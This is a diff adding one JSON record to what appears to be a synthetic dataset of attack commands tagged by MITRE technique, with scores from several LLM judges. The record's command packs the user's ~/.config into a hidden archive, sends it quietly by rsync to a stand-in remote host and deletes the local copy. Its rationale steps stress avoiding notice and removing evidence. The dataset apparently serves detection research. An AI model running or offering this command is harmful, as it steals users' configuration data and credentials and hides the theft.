@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "tar czf /tmp/.cfg-$HOSTNAME.tgz -C $HOME .config 2>/dev/null && rsync -azq /tmp/.cfg-$HOSTNAME.tgz backup@cdn.example.net:.cache/.rs/ && rm -f /tmp/.cfg-$HOSTNAME.tgz",
+  "explanation": "Aggregates configuration data into a compressed archive and exfiltrates it via rsync in a single quiet transfer, then cleans up, supporting automated bulk exfiltration (T1020).",
+  "rationale_steps": [
+    "Package target data to minimize multiple transfers.",
+    "Suppress tar output to avoid attention.",
+    "Use rsync for a single quiet upload.",
+    "Remove local artifact to reduce evidence."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-d10cd1e2-b089ed8f",
+  "source_prompt_hash": "d10cd1e2",
+  "timestamp_utc": "2025-09-30T09:04:44.050324Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash with valid tar and rsync flags, proper && chaining, and correct stderr redirection without quoting or parsing issues.",
+        "semantic_score": 4,
+        "semantic_justification": "It archives ~/.config, quietly transfers the archive to a remote host via rsync, and deletes the local file—aligned with automated exfiltration behaviors—though it lacks explicit scheduling or retry logic.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T02:16:37.015607Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper use of &&, valid tar/rsync/rm flags, correct variable expansion, balanced quoting, and appropriate stderr redirection.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully realizes T1020 by compressing the user's .config directory into a hidden, hostname-tagged archive, quietly exfiltrating it via rsync to a remote host, and then removing the local artifact to reduce forensic traces — a textbook automated exfiltration workflow.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-18T22:19:41.852106Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses valid bash syntax, correctly formatted tool flags, logical operators, and standard variable expansion without any syntax errors.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly demonstrates the lifecycle of automated exfiltration by packaging sensitive user configuration data, transferring it to a remote host, and cleaning up temporary files.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-18T22:19:43.139476Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
